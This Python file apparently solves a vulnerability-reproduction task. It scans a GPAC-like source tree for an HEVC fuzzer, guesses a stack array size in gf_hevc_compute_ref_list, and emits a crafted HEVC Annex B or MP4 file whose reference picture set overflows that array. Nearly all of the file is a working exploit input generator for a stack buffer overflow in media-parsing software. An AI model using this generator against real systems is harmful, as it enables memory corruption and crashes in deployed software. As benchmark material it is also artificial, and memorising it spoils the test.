import os
import re
import tarfile
from typing import Iterable, Optional, Tuple, List


class _BitWriter:
    __slots__ = ("_buf", "_cur", "_nbits")

    def __init__(self) -> None:
        self._buf = bytearray()
        self._cur = 0
        self._nbits = 0

    def write_bit(self, b: int) -> None:
        self._cur = (self._cur << 1) | (b & 1)
        self._nbits += 1
        if self._nbits == 8:
            self._buf.append(self._cur & 0xFF)
            self._cur = 0
            self._nbits = 0

    def write_bits(self, v: int, n: int) -> None:
        if n <= 0:
            return
        for i in range(n - 1, -1, -1):
            self.write_bit((v >> i) & 1)

    def write_ue(self, k: int) -> None:
        if k < 0:
            k = 0
        code_num = k + 1
        bl = code_num.bit_length()
        leading_zeros = bl - 1
        for _ in range(leading_zeros):
            self.write_bit(0)
        self.write_bits(code_num, bl)

    def write_se(self, x: int) -> None:
        if x == 0:
            code_num = 0
        elif x > 0:
            code_num = 2 * x - 1
        else:
            code_num = -2 * x
        self.write_ue(code_num)

    def rbsp_trailing_bits(self) -> None:
        self.write_bit(1)
        while self._nbits != 0:
            self.write_bit(0)

    def get_bytes(self) -> bytes:
        if self._nbits != 0:
            self._buf.append((self._cur << (8 - self._nbits)) & 0xFF)
            self._cur = 0
            self._nbits = 0
        return bytes(self._buf)


def _rbsp_to_ebsp(rbsp: bytes) -> bytes:
    out = bytearray()
    zc = 0
    for b in rbsp:
        if zc >= 2 and b <= 3:
            out.append(0x03)
            zc = 0
        out.append(b)
        if b == 0:
            zc += 1
        else:
            zc = 0
    return bytes(out)


def _hevc_nal_header(nal_type: int, layer_id: int = 0, tid_plus1: int = 1) -> bytes:
    nal_type &= 0x3F
    layer_id &= 0x3F
    tid_plus1 &= 0x07
    b0 = (nal_type << 1) | ((layer_id >> 5) & 0x01)
    b1 = ((layer_id & 0x1F) << 3) | tid_plus1
    return bytes((b0 & 0xFF, b1 & 0xFF))


def _make_nal_no_start(nal_type: int, rbsp: bytes) -> bytes:
    return _hevc_nal_header(nal_type) + _rbsp_to_ebsp(rbsp)


def _make_nal_annexb(nal_type: int, rbsp: bytes) -> bytes:
    return b"\x00\x00\x00\x01" + _make_nal_no_start(nal_type, rbsp)


def _write_profile_tier_level(bw: _BitWriter, level_idc: int = 120) -> None:
    bw.write_bits(0, 2)  # general_profile_space
    bw.write_bit(0)      # general_tier_flag
    bw.write_bits(1, 5)  # general_profile_idc
    bw.write_bits(0, 32)  # general_profile_compatibility_flags
    bw.write_bit(0)  # general_progressive_source_flag
    bw.write_bit(0)  # general_interlaced_source_flag
    bw.write_bit(0)  # general_non_packed_constraint_flag
    bw.write_bit(0)  # general_frame_only_constraint_flag
    bw.write_bits(0, 44)  # general_reserved_zero_44bits
    bw.write_bits(level_idc & 0xFF, 8)  # general_level_idc


def _build_vps_rbsp(max_dpb_minus1: int) -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)  # vps_video_parameter_set_id
    bw.write_bit(1)      # vps_base_layer_internal_flag
    bw.write_bit(1)      # vps_base_layer_available_flag
    bw.write_bits(0, 6)  # vps_max_layers_minus1
    bw.write_bits(0, 3)  # vps_max_sub_layers_minus1
    bw.write_bit(1)      # vps_temporal_id_nesting_flag
    bw.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits
    _write_profile_tier_level(bw, level_idc=120)
    bw.write_bit(1)  # vps_sub_layer_ordering_info_present_flag
    bw.write_ue(max_dpb_minus1 if max_dpb_minus1 >= 0 else 0)  # vps_max_dec_pic_buffering_minus1
    bw.write_ue(0)  # vps_max_num_reorder_pics
    bw.write_ue(0)  # vps_max_latency_increase_plus1
    bw.write_bits(0, 6)  # vps_max_layer_id
    bw.write_ue(0)  # vps_num_layer_sets_minus1
    bw.write_bit(0)  # vps_timing_info_present_flag
    bw.write_bit(0)  # vps_extension_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _build_sps_rbsp(num_negative_pics: int, max_dpb_minus1: int, poc_bits_minus4: int = 4) -> bytes:
    if poc_bits_minus4 < 0:
        poc_bits_minus4 = 0
    if poc_bits_minus4 > 12:
        poc_bits_minus4 = 12
    bw = _BitWriter()
    bw.write_bits(0, 4)  # sps_video_parameter_set_id
    bw.write_bits(0, 3)  # sps_max_sub_layers_minus1
    bw.write_bit(1)      # sps_temporal_id_nesting_flag
    _write_profile_tier_level(bw, level_idc=120)
    bw.write_ue(0)  # sps_seq_parameter_set_id
    bw.write_ue(1)  # chroma_format_idc
    bw.write_ue(64)  # pic_width_in_luma_samples
    bw.write_ue(64)  # pic_height_in_luma_samples
    bw.write_bit(0)  # conformance_window_flag
    bw.write_ue(0)   # bit_depth_luma_minus8
    bw.write_ue(0)   # bit_depth_chroma_minus8
    bw.write_ue(poc_bits_minus4)  # log2_max_pic_order_cnt_lsb_minus4
    bw.write_bit(1)  # sps_sub_layer_ordering_info_present_flag
    bw.write_ue(max_dpb_minus1 if max_dpb_minus1 >= 0 else 0)  # sps_max_dec_pic_buffering_minus1[0]
    bw.write_ue(0)  # sps_max_num_reorder_pics[0]
    bw.write_ue(0)  # sps_max_latency_increase_plus1[0]
    bw.write_ue(0)  # log2_min_luma_coding_block_size_minus3
    bw.write_ue(0)  # log2_diff_max_min_luma_coding_block_size
    bw.write_ue(0)  # log2_min_luma_transform_block_size_minus2
    bw.write_ue(0)  # log2_diff_max_min_luma_transform_block_size
    bw.write_ue(0)  # max_transform_hierarchy_depth_inter
    bw.write_ue(0)  # max_transform_hierarchy_depth_intra
    bw.write_bit(0)  # scaling_list_enabled_flag
    bw.write_bit(0)  # amp_enabled_flag
    bw.write_bit(0)  # sample_adaptive_offset_enabled_flag
    bw.write_bit(0)  # pcm_enabled_flag
    bw.write_ue(1)   # num_short_term_ref_pic_sets

    # st_ref_pic_set(0) - no inter_ref_pic_set_prediction_flag for stRpsIdx=0
    if num_negative_pics < 0:
        num_negative_pics = 0
    bw.write_ue(num_negative_pics)  # num_negative_pics
    bw.write_ue(0)  # num_positive_pics
    for _ in range(num_negative_pics):
        bw.write_ue(0)  # delta_poc_s0_minus1
        bw.write_bit(1)  # used_by_curr_pic_s0_flag
    # no positive pics

    bw.write_bit(0)  # long_term_ref_pics_present_flag
    bw.write_bit(0)  # sps_temporal_mvp_enabled_flag
    bw.write_bit(0)  # strong_intra_smoothing_enabled_flag
    bw.write_bit(0)  # vui_parameters_present_flag
    bw.write_bit(0)  # sps_extension_present_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _build_pps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_ue(0)  # pps_pic_parameter_set_id
    bw.write_ue(0)  # pps_seq_parameter_set_id
    bw.write_bit(0)  # dependent_slice_segments_enabled_flag
    bw.write_bit(0)  # output_flag_present_flag
    bw.write_bits(0, 3)  # num_extra_slice_header_bits
    bw.write_bit(0)  # sign_data_hiding_enabled_flag
    bw.write_bit(0)  # cabac_init_present_flag
    bw.write_ue(0)   # num_ref_idx_l0_default_active_minus1
    bw.write_ue(0)   # num_ref_idx_l1_default_active_minus1
    bw.write_se(0)   # init_qp_minus26
    bw.write_bit(0)  # constrained_intra_pred_flag
    bw.write_bit(0)  # transform_skip_enabled_flag
    bw.write_bit(0)  # cu_qp_delta_enabled_flag
    bw.write_se(0)   # pps_cb_qp_offset
    bw.write_se(0)   # pps_cr_qp_offset
    bw.write_bit(0)  # pps_slice_chroma_qp_offsets_present_flag
    bw.write_bit(0)  # weighted_pred_flag
    bw.write_bit(0)  # weighted_bipred_flag
    bw.write_bit(0)  # transquant_bypass_enabled_flag
    bw.write_bit(0)  # tiles_enabled_flag
    bw.write_bit(0)  # entropy_coding_sync_enabled_flag
    bw.write_bit(0)  # pps_loop_filter_across_slices_enabled_flag
    bw.write_bit(0)  # deblocking_filter_control_present_flag
    bw.write_bit(0)  # pps_scaling_list_data_present_flag
    bw.write_bit(0)  # lists_modification_present_flag
    bw.write_ue(0)   # log2_parallel_merge_level_minus2
    bw.write_bit(0)  # slice_segment_header_extension_present_flag
    bw.write_bit(0)  # pps_extension_present_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _build_slice_rbsp(nal_type: int, slice_type: int, poc_lsb: int, poc_bits: int) -> bytes:
    bw = _BitWriter()
    bw.write_bit(1)  # first_slice_segment_in_pic_flag
    if 16 <= nal_type <= 23:
        bw.write_bit(0)  # no_output_of_prior_pics_flag
    bw.write_ue(0)  # slice_pic_parameter_set_id

    # first_slice_segment_in_pic_flag == 1 => no dependent slice fields
    bw.write_ue(slice_type)  # slice_type

    # output_flag_present_flag == 0 => none
    # separate_colour_plane_flag == 0 => none

    if nal_type not in (19, 20):  # not IDR
        bw.write_bits(poc_lsb & ((1 << poc_bits) - 1), poc_bits)  # slice_pic_order_cnt_lsb
        bw.write_bit(1)  # short_term_ref_pic_set_sps_flag (use SPS RPS 0)
        # long_term_ref_pics_present_flag == 0 => none
        # sps_temporal_mvp_enabled_flag == 0 => none
    # sps_sao_enabled_flag == 0 => none

    if slice_type in (0, 1):  # B or P
        bw.write_bit(0)  # num_ref_idx_active_override_flag
        # lists_modification_present_flag == 0 => none
        # B-only fields absent
        # cabac_init_present_flag == 0 => none
        # slice_temporal_mvp_enabled_flag == 0 => none
        # weighted_pred/bipred == 0 => none

    bw.write_se(0)  # slice_qp_delta
    # chroma_qp_offsets_present_flag == 0 => none
    # deblocking_filter_control_present_flag == 0 => none
    # tiles/entropy_sync == 0 => none
    # slice_segment_header_extension_present_flag == 0 => none

    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _be_u32(x: int) -> bytes:
    return bytes(((x >> 24) & 0xFF, (x >> 16) & 0xFF, (x >> 8) & 0xFF, x & 0xFF))


def _be_u16(x: int) -> bytes:
    return bytes(((x >> 8) & 0xFF, x & 0xFF))


def _mp4_box(typ: bytes, payload: bytes) -> bytes:
    return _be_u32(8 + len(payload)) + typ + payload


def _build_hvcc(vps_nal: bytes, sps_nal: bytes, pps_nal: bytes) -> bytes:
    # Minimal, mostly zeroed; enough for many parsers
    configuration_version = 1
    general_profile_space = 0
    general_tier_flag = 0
    general_profile_idc = 1
    general_profile_compatibility_flags = 0
    general_constraint_indicator_flags = 0
    general_level_idc = 120

    min_spatial_segmentation_idc = 0
    parallelism_type = 0
    chroma_format = 1
    bit_depth_luma_minus8 = 0
    bit_depth_chroma_minus8 = 0
    avg_frame_rate = 0
    constant_frame_rate = 0
    num_temporal_layers = 1
    temporal_id_nested = 1
    length_size_minus_one = 3  # 4-byte NAL lengths

    arrays = []

    def add_array(nal_unit_type: int, nal: bytes) -> None:
        # array_completeness=1, reserved=0
        hdr = bytes(((1 << 7) | (nal_unit_type & 0x3F),))
        arrays.append(
            hdr +
            _be_u16(1) +
            _be_u16(len(nal)) + nal
        )

    add_array(32, vps_nal)
    add_array(33, sps_nal)
    add_array(34, pps_nal)

    out = bytearray()
    out.append(configuration_version & 0xFF)
    out.append(((general_profile_space & 0x3) << 6) | ((general_tier_flag & 0x1) << 5) | (general_profile_idc & 0x1F))
    out += _be_u32(general_profile_compatibility_flags)
    out += general_constraint_indicator_flags.to_bytes(6, "big", signed=False)
    out.append(general_level_idc & 0xFF)
    out += _be_u16(0xF000 | (min_spatial_segmentation_idc & 0x0FFF))
    out.append(0xFC | (parallelism_type & 0x03))
    out.append(0xFC | (chroma_format & 0x03))
    out.append(0xF8 | (bit_depth_luma_minus8 & 0x07))
    out.append(0xF8 | (bit_depth_chroma_minus8 & 0x07))
    out += _be_u16(avg_frame_rate & 0xFFFF)
    out.append(((constant_frame_rate & 0x03) << 6) | ((num_temporal_layers & 0x07) << 3) | ((temporal_id_nested & 0x01) << 2) | (length_size_minus_one & 0x03))
    out.append(len(arrays) & 0xFF)
    for a in arrays:
        out += a
    return bytes(out)


def _build_mp4(samples: List[bytes], vps_nal: bytes, sps_nal: bytes, pps_nal: bytes) -> bytes:
    # ftyp
    ftyp = _mp4_box(b"ftyp", b"isom" + _be_u32(0x200) + b"isomiso6mp41")

    # sample entry hvc1 + hvcC
    hvcc = _build_hvcc(vps_nal, sps_nal, pps_nal)
    hvcc_box = _mp4_box(b"hvcC", hvcc)

    # hvc1 sample entry (simplified)
    # SampleEntry: 6 reserved + data_reference_index
    # VisualSampleEntry fields minimal
    hvc1 = bytearray()
    hvc1 += b"\x00\x00\x00\x00\x00\x00"  # reserved
    hvc1 += _be_u16(1)  # data_reference_index
    hvc1 += b"\x00\x00"  # pre_defined
    hvc1 += b"\x00\x00"  # reserved
    hvc1 += b"\x00\x00\x00\x00" * 3  # pre_defined[3]
    hvc1 += _be_u16(64)  # width
    hvc1 += _be_u16(64)  # height
    hvc1 += _be_u32(0x00480000)  # horizresolution 72 dpi
    hvc1 += _be_u32(0x00480000)  # vertresolution
    hvc1 += _be_u32(0)  # reserved
    hvc1 += _be_u16(1)  # frame_count
    hvc1 += bytes((0,)) + (b"\x00" * 31)  # compressorname
    hvc1 += _be_u16(0x0018)  # depth
    hvc1 += b"\xFF\xFF"  # pre_defined
    hvc1 += hvcc_box
    hvc1_box = _mp4_box(b"hvc1", bytes(hvc1))

    stsd = _mp4_box(b"stsd", b"\x00\x00\x00\x00" + _be_u32(1) + hvc1_box)
    stts = _mp4_box(b"stts", b"\x00\x00\x00\x00" + _be_u32(1) + _be_u32(len(samples)) + _be_u32(1))
    stsc = _mp4_box(b"stsc", b"\x00\x00\x00\x00" + _be_u32(1) + _be_u32(1) + _be_u32(len(samples)) + _be_u32(1))
    stsz_payload = bytearray()
    stsz_payload += b"\x00\x00\x00\x00"
    stsz_payload += _be_u32(0)  # sample_size = 0 (sizes table follows)
    stsz_payload += _be_u32(len(samples))
    for s in samples:
        stsz_payload += _be_u32(len(s))
    stsz = _mp4_box(b"stsz", bytes(stsz_payload))
    # stco patched later
    stco_placeholder = _mp4_box(b"stco", b"\x00\x00\x00\x00" + _be_u32(1) + _be_u32(0))
    stbl = _mp4_box(b"stbl", stsd + stts + stsc + stsz + stco_placeholder)

    dinf = _mp4_box(b"dinf", _mp4_box(b"dref", b"\x00\x00\x00\x00" + _be_u32(1) + _mp4_box(b"url ", b"\x00\x00\x00\x01")))
    vmhd = _mp4_box(b"vmhd", b"\x00\x00\x00\x01" + b"\x00\x00" + b"\x00\x00" * 3)
    minf = _mp4_box(b"minf", vmhd + dinf + stbl)

    hdlr = _mp4_box(b"hdlr", b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"vide" + b"\x00" * 12 + b"\x00")
    mdhd = _mp4_box(b"mdhd", b"\x00\x00\x00\x00" + _be_u32(0) + _be_u32(0) + _be_u32(1000) + _be_u32(0) + _be_u16(0x55C4) + _be_u16(0))
    mdia = _mp4_box(b"mdia", mdhd + hdlr + minf)

    tkhd = _mp4_box(b"tkhd", b"\x00\x00\x00\x07" + _be_u32(0) + _be_u32(0) + _be_u32(1) + _be_u32(0) + _be_u32(0) +
                    b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00" + b"\x00\x00" +
                    b"\x00\x00" + b"\x00\x00" + b"\x00\x00\x00\x00" * 9 +
                    _be_u32(64 << 16) + _be_u32(64 << 16))
    trak = _mp4_box(b"trak", tkhd + mdia)

    mvhd = _mp4_box(b"mvhd", b"\x00\x00\x00\x00" + _be_u32(0) + _be_u32(0) + _be_u32(1000) + _be_u32(0) +
                    _be_u32(0x00010000) + _be_u16(0x0100) + _be_u16(0) + b"\x00" * 10 +
                    b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    b"\x40\x00\x00\x00" +
                    b"\x00\x00\x00\x00" * 6 +
                    _be_u32(2))
    moov_wo_stco = _mp4_box(b"moov", mvhd + trak)

    # mdat payload = concatenated samples (already length-prefixed NALs)
    mdat_payload = b"".join(samples)
    mdat = _mp4_box(b"mdat", mdat_payload)

    # Patch stco: chunk offset points to start of mdat data payload
    # Layout: ftyp + moov + mdat, chunk data starts at offset len(ftyp)+len(moov)+8
    # Need rebuild moov with correct stco
    chunk_offset = len(ftyp) + len(moov_wo_stco) + 8

    # Rebuild with correct stco
    stco = _mp4_box(b"stco", b"\x00\x00\x00\x00" + _be_u32(1) + _be_u32(chunk_offset))

    stbl2 = _mp4_box(b"stbl", stsd + stts + stsc + stsz + stco)
    minf2 = _mp4_box(b"minf", vmhd + dinf + stbl2)
    mdia2 = _mp4_box(b"mdia", mdhd + hdlr + minf2)
    trak2 = _mp4_box(b"trak", tkhd + mdia2)
    moov = _mp4_box(b"moov", mvhd + trak2)

    # Recompute chunk offset with rebuilt moov (sizes can differ slightly due to stco payload, same size though)
    chunk_offset2 = len(ftyp) + len(moov) + 8
    if chunk_offset2 != chunk_offset:
        stco = _mp4_box(b"stco", b"\x00\x00\x00\x00" + _be_u32(1) + _be_u32(chunk_offset2))
        stbl2 = _mp4_box(b"stbl", stsd + stts + stsc + stsz + stco)
        minf2 = _mp4_box(b"minf", vmhd + dinf + stbl2)
        mdia2 = _mp4_box(b"mdia", mdhd + hdlr + minf2)
        trak2 = _mp4_box(b"trak", tkhd + mdia2)
        moov = _mp4_box(b"moov", mvhd + trak2)

    return ftyp + moov + mdat


def _iter_text_sources_from_dir(root: str) -> Iterable[Tuple[str, bytes]]:
    for base, _, files in os.walk(root):
        for fn in files:
            lfn = fn.lower()
            if not (lfn.endswith((".c", ".cc", ".cpp", ".h", ".hpp")) or "fuzz" in lfn or "fuzzer" in lfn):
                continue
            path = os.path.join(base, fn)
            try:
                st = os.stat(path)
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                with open(path, "rb") as f:
                    data = f.read()
                yield path, data
            except OSError:
                continue


def _iter_text_sources_from_tar(tar_path: str) -> Iterable[Tuple[str, bytes]]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                lname = name.lower()
                if not (lname.endswith((".c", ".cc", ".cpp", ".h", ".hpp")) or "fuzz" in lname or "fuzzer" in lname):
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    yield name, data
                except Exception:
                    continue
    except Exception:
        return


def _infer_from_sources(src_path: str) -> Tuple[int, str]:
    # Returns (stack_limit_guess, kind_guess) where kind_guess in {"annexb","mp4"}
    kind = "annexb"
    limit = 16

    best_fuzzer_score = -1
    best_fuzzer_text = ""

    compute_ref_text = ""
    compute_ref_score = -1

    it: Iterable[Tuple[str, bytes]]
    if os.path.isdir(src_path):
        it = _iter_text_sources_from_dir(src_path)
    else:
        it = _iter_text_sources_from_tar(src_path)

    for name, data in it:
        try:
            txt = data.decode("utf-8", "ignore")
        except Exception:
            continue
        ltxt = txt.lower()
        lname = name.lower()

        if "llvmfuzzertestoneinput" in ltxt:
            score = 0
            if "hevc" in ltxt or "h265" in ltxt:
                score += 80
            if "compute_ref_list" in ltxt or "gf_hevc_compute_ref_list" in ltxt:
                score += 200
            if "isom" in ltxt or "mp4" in ltxt:
                score += 20
            if "hevc" in lname or "h265" in lname:
                score += 20
            if "fuzz" in lname or "fuzzer" in lname:
                score += 10
            if score > best_fuzzer_score:
                best_fuzzer_score = score
                best_fuzzer_text = ltxt

        if "gf_hevc_compute_ref_list" in ltxt:
            score = 0
            if "refpicset" in ltxt or "ref_pic" in ltxt:
                score += 10
            if "stack" in ltxt:
                score += 2
            if "hevc" in lname:
                score += 10
            score += 100
            if score > compute_ref_score:
                compute_ref_score = score
                compute_ref_text = txt

    if best_fuzzer_text:
        if ("gf_isom_open_memory" in best_fuzzer_text) or ("gf_isom_open" in best_fuzzer_text) or ("isom_open" in best_fuzzer_text):
            kind = "mp4"
        elif ("gf_media_nalu" in best_fuzzer_text) or ("annex" in best_fuzzer_text) or ("start code" in best_fuzzer_text):
            kind = "annexb"
        elif ("hvcc" in best_fuzzer_text) and ("isom" in best_fuzzer_text):
            kind = "mp4"

    if compute_ref_text:
        # Try to find small stack array sizes used in the function
        # Prefer 16 if present, else smallest reasonable size.
        sizes = [int(x) for x in re.findall(r"\[\s*([0-9]{1,3})\s*\]", compute_ref_text)]
        candidates = [s for s in sizes if 4 <= s <= 128]
        if 16 in candidates:
            limit = 16
        elif candidates:
            # choose the most common small size; fallback to min
            freq = {}
            for s in candidates:
                freq[s] = freq.get(s, 0) + 1
            # prefer smaller among tied max frequency
            best = sorted(freq.items(), key=lambda kv: (-kv[1], kv[0]))[0][0]
            limit = best

    if limit < 8:
        limit = 8
    if limit > 64:
        limit = 64

    return limit, kind


def _generate_annexb_poc(overflow_n: int) -> bytes:
    if overflow_n < 2:
        overflow_n = 17
    if overflow_n > 40:
        overflow_n = 40

    max_dpb_minus1 = max(overflow_n + 4, 31)
    poc_bits_minus4 = 4  # 8-bit POC LSB
    poc_bits = poc_bits_minus4 + 4

    vps = _build_vps_rbsp(max_dpb_minus1)
    sps = _build_sps_rbsp(overflow_n, max_dpb_minus1, poc_bits_minus4=poc_bits_minus4)
    pps = _build_pps_rbsp()

    out = bytearray()
    out += _make_nal_annexb(32, vps)
    out += _make_nal_annexb(33, sps)
    out += _make_nal_annexb(34, pps)

    # First picture: IDR I-slice to initialize state
    out += _make_nal_annexb(19, _build_slice_rbsp(19, 2, 0, poc_bits))

    # Followed by P slices with increasing POC to accumulate references
    num_pics = overflow_n + 4
    for poc in range(1, num_pics + 1):
        rbsp = _build_slice_rbsp(1, 1, poc, poc_bits)
        out += _make_nal_annexb(1, rbsp)

    return bytes(out)


def _generate_mp4_poc(overflow_n: int) -> bytes:
    if overflow_n < 2:
        overflow_n = 17
    if overflow_n > 40:
        overflow_n = 40

    max_dpb_minus1 = max(overflow_n + 4, 31)
    poc_bits_minus4 = 4
    poc_bits = poc_bits_minus4 + 4

    vps_rbsp = _build_vps_rbsp(max_dpb_minus1)
    sps_rbsp = _build_sps_rbsp(overflow_n, max_dpb_minus1, poc_bits_minus4=poc_bits_minus4)
    pps_rbsp = _build_pps_rbsp()

    vps_nal = _make_nal_no_start(32, vps_rbsp)
    sps_nal = _make_nal_no_start(33, sps_rbsp)
    pps_nal = _make_nal_no_start(34, pps_rbsp)

    # Create multiple samples, each containing one NAL (length-prefixed)
    samples: List[bytes] = []

    # Sample 0: IDR I-slice
    idr_nal = _make_nal_no_start(19, _build_slice_rbsp(19, 2, 0, poc_bits))
    samples.append(_be_u32(len(idr_nal)) + idr_nal)

    # P samples
    num_samples = overflow_n + 4
    for poc in range(1, num_samples + 1):
        p_nal = _make_nal_no_start(1, _build_slice_rbsp(1, 1, poc, poc_bits))
        samples.append(_be_u32(len(p_nal)) + p_nal)

    return _build_mp4(samples, vps_nal, sps_nal, pps_nal)


class Solution:
    def solve(self, src_path: str) -> bytes:
        limit, kind = _infer_from_sources(src_path)
        overflow_n = min(max(limit + 1, 17), 40)
        if kind == "mp4":
            return _generate_mp4_poc(overflow_n)
        return _generate_annexb_poc(overflow_n)